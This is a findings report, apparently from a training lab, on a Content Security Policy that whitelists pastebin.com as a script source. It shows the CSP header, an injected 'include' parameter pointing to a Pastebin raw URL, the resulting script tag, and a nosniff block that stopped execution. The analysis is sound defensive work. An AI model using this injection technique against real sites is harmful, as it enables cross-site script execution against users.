# Findings — Content Security Policy (CSP) Bypass Lab

## Vulnerability
**Type:** Content Security Policy Misconfiguration (Overly Permissive `script-src` Whitelist)
**Location:** CSP header on `/vulnerabilities/csp/`; exploitation vector via the `include` POST parameter
**CWE:** CWE-1021 — Improper Restriction of Rendered UI Layers or Frames (related family); more specifically this maps to a CSP-specific weakness pattern: trusting an attacker-controllable third-party origin as a script source
**Severity:** Medium (downgraded from High due to a confirmed mitigating factor — see Impact)
**CVSS 3.1 (estimated):** 5.4 (AV:N/AC:H/PR:N/UI:R/S:C/C:L/I:L/A:N) — High attack complexity reflects that successful exploitation currently depends on finding a whitelisted domain that both accepts attacker content and serves it with an executable script MIME type.

## Description
The application's Content Security Policy whitelists `pastebin.com` as a trusted `script-src`. Pastebin is a public service where any user can publish arbitrary text content and obtain a stable, CSP-trusted URL — meaning the policy effectively trusts arbitrary third-party attackers, not just the application's legitimate script sources. This defeats a core purpose of CSP, which is to restrict script execution to a known, trusted set of origins.

## Evidence

### 1. CSP header confirms the misconfigured whitelist
```
Content-Security-Policy: script-src 'self' https://pastebin.com example.com code.jquery.com https://ssl.google-analytics.com;
```

### 2. Application embeds attacker-supplied URLs without additional filtering
Submitting `include=https://pastebin.com/raw/AGdT1hVw` resulted in:
```html
<script src='https://pastebin.com/raw/AGdT1hVw'></script>
```
embedded directly in the served page — the application performs no server-side validation of the `include` parameter, relying entirely on the browser's CSP enforcement as its only control.

### 3. CSP permitted the connection (confirmed via absence of CSP violation)
Browser DevTools Console showed **no CSP violation** for the request to `pastebin.com` — proving the whitelist entry functions as expected and the browser was willing to load a script from that origin.

### 4. Execution blocked by a separate, independent control
```
The resource from "https://pastebin.com/raw/AGdT1hVw" was blocked due to
MIME type ("text/plain") mismatch (X-Content-Type-Options: nosniff).
```
Pastebin serves raw paste content as `text/plain` with `X-Content-Type-Options: nosniff`, which caused the browser to refuse execution — independent of and unrelated to the CSP itself.

## Impact
- **The core CSP misconfiguration is real:** any application design that trusts a domain where third parties can publish arbitrary content as a script source is fundamentally unsound, regardless of whether this specific proof-of-concept fully executed.
- **Mitigating factor (reduces but does not eliminate risk):** the specific attacker-writable domain used in this test (Pastebin) happens to serve content with response headers that block script execution in modern, standards-compliant browsers. This is not a property of the CSP configuration itself, and:
  - Older or non-standard browsers may not enforce `X-Content-Type-Options: nosniff` consistently
  - A different attacker-writable whitelisted domain (or a different content-hosting technique on the same domain, e.g., an API endpoint that returns `application/javascript`) could plausibly bypass this specific limitation
  - The underlying application logic (accepting arbitrary URLs into a `<script src>` tag) remains dangerous even where this particular exploitation path is currently blocked
- **Residual risk:** Should be treated as a real finding requiring remediation, not dismissed as "not exploitable," since the mitigating factor is incidental to Pastebin's configuration rather than a deliberate, verified defense built into this application.

## Root Cause
The CSP `script-src` directive whitelists third-party domains without regard to whether those domains host attacker-controllable content. A safe CSP policy should only whitelist origins the application owner fully controls, or origins serving content with cryptographic integrity guarantees (Subresource Integrity / SRI hashes) rather than trusting a domain's entire content wholesale.
